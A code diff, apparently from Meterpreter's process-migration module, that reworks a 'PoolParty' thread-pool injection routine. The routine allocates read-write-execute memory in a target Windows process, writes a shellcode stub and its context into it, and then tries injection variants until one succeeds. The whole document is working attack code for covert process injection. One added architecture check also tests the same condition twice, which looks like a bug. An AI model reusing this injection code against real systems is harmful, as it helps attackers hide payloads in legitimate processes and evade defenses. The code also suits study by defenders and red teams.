@@ -504,9 +504,8 @@ DWORD inject_via_remotethread(Remote * remote, Packet * response, HANDLE hProces
 }
 
 DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DWORD dwDestinationArch, LPVOID lpStartAddress, LPVOID lpParameter) {
-	// TODO: Use specific variant for different targets.
 	DWORD dwResult = ERROR_SUCCESS;
-	DWORD dwTechnique = MIGRATE_TECHNIQUE_REMOTETHREAD;
+	DWORD dwTechnique = MIGRATE_TECHNIQUE_POOLPARTY;
 	HANDLE hThread = NULL;
 	LPVOID lpPoolPartyStub;
 	POOLPARTYCONTEXT ctx = { 0 };
@@ -517,8 +516,6 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 
 	LPVOID lpStub = NULL;
 	DWORD dwStubSize = 0;
-
-	DWORD dwPoolPartyVariant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION;
 	HANDLE hHeap = GetProcessHeap();
 	
 
@@ -530,64 +527,59 @@ DWORD inject_via_poolparty(Remote* remote, Packet* response, HANDLE hProcess, DW
 
 	do
 	{
-		
-		if (TRUE) {
-			if (dwDestinationArch == PROCESS_ARCH_X64) {
-				dprintf("[INJECT][inject_via_poolparty] using: poolparty_stub_x64");
-				lpStub = &poolparty_stub_x64;
-				dwStubSize = sizeof(poolparty_stub_x64) - 1;
-			}
-			else {
-				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on x86 targets (yet)!", ERROR_POOLPARTY_GENERIC);
-			}
-
-			hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-			if (!hTriggerEvent)
-			{
-				BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
-			}
-
-			// Duplicate the event handle for the target process
-			if (!DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
-			{
-				BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
-			}
-
-			lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-			dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
-			if (!lpPoolPartyStub) {
-				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!", ERROR_POOLPARTY_GENERIC);
-			}
-			
-			if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
-				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
-			}
-
-			if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
-				BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
-			}
-
-			for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
-				if (poolparty->variants[variant].isInjectionSupported) {
-#ifdef DEBUGTRACE
-					char* VARIANT_POS_TO_STR[POOLPARTY_TECHNIQUE_COUNT] = {
-						"POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION",
-					};
-					dprintf("[INJECT][inject_via_poolparty] Attempting injection with variant %s", VARIANT_POS_TO_STR[variant]);
-#endif
-					dwResult = poolparty->variants[variant].handler(hProcess, dwDestinationArch, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent);
-					if (dwResult == ERROR_SUCCESS) {
-						dprintf("[INJECT] inject_via_poolparty: injectied!");
-						break;
-					}
-				}
-			}
-			if (dwResult != ERROR_SUCCESS) {
-				BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_POOLPARTY_GENERIC)
-			}
+	
+		if (dwDestinationArch == PROCESS_ARCH_X64 && (dwMeterpreterArch == PROCESS_ARCH_X86 || dwMeterpreterArch == PROCESS_ARCH_X86)) {
+			dprintf("[INJECT][inject_via_poolparty] using: poolparty_stub_x64");
+			lpStub = &poolparty_stub_x64;
+			dwStubSize = sizeof(poolparty_stub_x64) - 1;
 		}
 		else {
-			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: this technique doesn't work on wow64", ERROR_POOLPARTY_GENERIC)
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Can't inject on this target (yet)!", ERROR_POOLPARTY_GENERIC);
+		}
+
+		hTriggerEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
+		if (!hTriggerEvent)
+		{
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] CreateEvent failed");
+		}
+
+		// Duplicate the event handle for the target process
+		if (!DuplicateHandle(GetCurrentProcess(), hTriggerEvent, hProcess, &ctx.e.hTriggerEvent, 0, TRUE, DUPLICATE_SAME_ACCESS))
+		{
+			BREAK_ON_ERROR("[INJECT][inject_via_poolparty] DuplicateHandle failed");
+		}
+
+		lpPoolPartyStub = VirtualAllocEx(hProcess, NULL, dwStubSize + sizeof(POOLPARTYCONTEXT), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		dprintf("[INJECT][inject_via_poolparty] ctx [%p] lpStartAddress: %p lpParameter %p hTriggerEvent %p", (LPBYTE) lpPoolPartyStub + dwStubSize, ctx.s.lpStartAddress, ctx.p.lpParameter, ctx.e.hTriggerEvent);
+		if (!lpPoolPartyStub) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] VirtualAllocEx failed!", ERROR_POOLPARTY_GENERIC);
+		}
+		
+		if (!WriteProcessMemory(hProcess, lpPoolPartyStub, lpStub, dwStubSize, NULL)) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Cannot write custom shellcode!", ERROR_POOLPARTY_GENERIC);
+		}
+
+		if (!WriteProcessMemory(hProcess, (BYTE *)lpPoolPartyStub + dwStubSize, &ctx, sizeof(POOLPARTYCONTEXT), NULL)) {
+			BREAK_WITH_ERROR("[INJECT][inject_via_poolparty] Cannot write poolparty shellcode prologue!", ERROR_POOLPARTY_GENERIC);
+		}
+
+		for (UINT8 variant = POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION; variant < POOLPARTY_TECHNIQUE_COUNT; variant++) {
+			if (poolparty->variants[variant].isInjectionSupported) {
+#ifdef DEBUGTRACE
+				char* VARIANT_POS_TO_STR[POOLPARTY_TECHNIQUE_COUNT] = {
+					"POOLPARTY_TECHNIQUE_TP_DIRECT_INSERTION",
+				};
+				dprintf("[INJECT][inject_via_poolparty] Attempting injection with variant %s", VARIANT_POS_TO_STR[variant]);
+#endif
+				dwResult = poolparty->variants[variant].handler(hProcess, dwDestinationArch, lpPoolPartyStub, (BYTE*)lpPoolPartyStub + dwStubSize, &hTriggerEvent);
+				if (dwResult == ERROR_SUCCESS) {
+					dprintf("[INJECT] inject_via_poolparty: injected!");
+					break;
+				}
+			}
+		}
+		if (dwResult != ERROR_SUCCESS) {
+			BREAK_WITH_ERROR("[INJECT] inject_via_poolparty: none of the supported variant worked.", ERROR_POOLPARTY_GENERIC)
 		}
 
 		if (remote && response)
